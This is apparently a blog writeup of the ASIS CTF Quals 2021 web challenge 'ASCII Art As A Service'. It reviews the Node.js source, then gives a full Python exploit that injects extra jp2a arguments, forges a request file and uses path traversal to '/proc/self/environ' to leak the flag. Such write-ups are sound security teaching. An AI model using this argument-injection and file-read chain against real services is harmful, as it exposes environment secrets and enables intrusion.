---
layout: default
title: "ASCII Art As A Service (ASIS CTF Quals 2021)"
date: 2021-10-25
permalink: /aaaas/
categories: ctf web js
---

A writeup for ASCII Art As A Service, from [ASIS CTF Quals](https://ctftime.org/event/1415).
<!--more-->

The description for this challenge read 'You can convert your images to ASCII art. It is AaaS! 🤣'. Visiting the service, we are given a text box with a submission link.

Entering a link to an image would (after a few seconds) send back the image as ASCII art. The source is provided:

## Source Code Analysis

```js
app.post('/request',(req,res)=>{
    const url = req.body.url
    const reqToken = genRequestToken()
    const reqFileName = `./request/${reqToken}`
    const outputFileName = `./output/${genRequestToken()}`

    fs.writeFileSync(reqFileName,[reqToken,req.session.id,"Processing..."].join('|'))
    setTimeout(()=>{
        try{
            const output = childProcess.execFileSync("timeout",["2","jp2a",...url])
            fs.writeFileSync(outputFileName,output.toString())
            fs.writeFileSync(reqFileName,[reqToken,req.session.id,outputFileName].join('|'))
        } catch(e){
            fs.writeFileSync(reqFileName,[reqToken,req.session.id,"Something bad happened!"].join('|'))
        }
    },2000)
    res.redirect(`/request/${reqToken}`)
})
```
Our url is passed to JP2a (with a timeout of two seconds). Every request is given a unique 'request token', which is used as the name of the 'request file'. This file contains the current status of the request, along with the request token and session ID.

If JP2A finishes successfully, the output is written to 'outputFileName' (another random unique token), and the path to this output file is written to the request file.

There is an obvious command injection bug here: our URL is an array, and the spread operator (`...url`) expands it out - this allows us to provide extra arguments to JP2A.

```js
app.get("/request/:reqtoken",(req,res)=>{
	const reqToken = req.params.reqtoken
	const reqFilename = `./request/${reqToken}`
	var content
	if(!/^[a-zA-Z0-9]{32}$/.test(reqToken) || !fs.existsSync(reqFilename)) return res.json( { failed: true, result: "bad request token." })

	const [origReqToken,ownerSessid,result] = fs.readFileSync(reqFilename).toString().split("|")

	if(req.session.id != ownerSessid) return res.json( { failed: true, result: "Permissions..." })
	if(result[0] != ".") return res.json( { failed: true, result: result })

	try{
		content = fs.readFileSync(result).toString();
	} catch(e) {
		return res.json({ failed: false, result: "Something bad happened!" })
	}

	res.json({ failed: false, result: content })
	res.end()
})
```
After our request completes, we are redirected to the appropriate 'reqToken' route. This will check that our session ID matches that of the request file, and display the previously set output file if so.

Finally, the flag endpoint:

```js
app.get("/flag",(req,res)=>{
	if(req.ip == "127.0.0.1" || req.ip == "::ffff:127.0.0.1") res.json({ failed: false, result: flag })
	else res.json({ failed: true, result: "Flag is not yours..." })
})
```
'flag' is set in the environment, so it is not available as a regular file.

Finally, the `docker-compose` looks like:
```yml
    read_only: true
    tmpfs:
      - /app/request
      - /app/output
      - /tmp
```
Thus, only the 3 given paths are writable.

## Solving
JP2A by default outputs to stdout, but the `--output` flag allows us to specify a file to write to. This means we can write to arbritrary files! Initially, this output seemed uncontrolled - but JP2A provides a `--chars` argument, which specifies the dictionary of characters that pixels/regions are transformed to.

After some experimenting, I found that this can give a very simple write primitive - by simply linking to a black-white gradient of 50 pixels width, and providing 50 characters, it should return exactly our input!

With this, we had arbritrary file write. By writing to a 'request file' with our session ID and a file path, we could extend this to gain arbritrary file read!

### Image Generation

```py
from PIL import Image
import numpy as np


s = "|2DLQEZRivGXt_c_tw4sRxe1CtYWjLbyC|FILEPATH|"

# Use 16 bit colours for more granularity
arr = list(np.linspace(255*255, 1, num=len(s)))
arr = [[x]*3 for x in arr]
arr = np.array(arr, dtype=np.uint16)
arr = np.rot90(arr)
arr = arr[1:2]
im = Image.fromarray(arr)
im.save('test.png')
```

The question now was what file to read? The flag was only stored in the environment - which is readable at the linux pseudo-file `/proc/self/environ`! 
There is a check that the filename begins with `.`, but this is easily bypassed with `../../proc/self/environ`

With this, the exploit path is clear:

1. Obtain a session cookie
2. Host a gradient image
3. Provide a controlled string to write `|<cookie_id>|../../proc/self/environ|` to a fake request-file
4. Request that file, which will cause the flag to be read out

```py
import time
import subprocess
import requests
url = "http://vps.clubby789.me:8080/test.png"
s = requests.Session()
r = s.post("http://asciiart.asisctf.com:9000/request", headers={"Content-Type": "application/json"}, data={"url": [url]})
sid = r.cookies['connect.sid'][4:].split('.')[0]

payload = f"|{sid}|../../proc/self/environ|"
# jp2a mixed up the characters so we had to rearrange the string a little
payload = list(payload)
payload.append(payload.pop(29))
payload = ''.join(payload)
print("RESULT")
r = s.post("http://asciiart.asisctf.com:9000/request",
    json={"url": [url, f"--width={len(payload)}", url, f"--chars={payload}", "-i", f"--size={len(payload)}x1"]}, allow_redirects=False)
loc = r.headers['Location']
time.sleep(3)
# Confirming path is correct
print("Output of first: ")
print(s.get("http://asciiart.asisctf.com:9000" + loc).json()['result'])

# Setup a payload to write to the file
myloc = "B"*32
data = json={"url": [url, f"--width={len(payload)}", url, f"--chars={payload}", "-i", f"--size={len(payload)}x1", "--output=/app/request/" + myloc]}
print(data)
r = s.post("http://asciiart.asisctf.com:9000/request",
    json=data, allow_redirects=False)
loc = r.headers['Location']
# Wait for the file to be written out
time.sleep(3)
print("Output of second: ")
print(s.get("http://asciiart.asisctf.com:9000" + loc).json()['result'])
print("HERE WE GO")
# Get the flag
print(s.get("http://asciiart.asisctf.com:9000/request/" + myloc).text)
```

After a few seconds, we obtain the flag:

`ASIS{ascii_art_is_the_real_art_o/_a39bc8}`

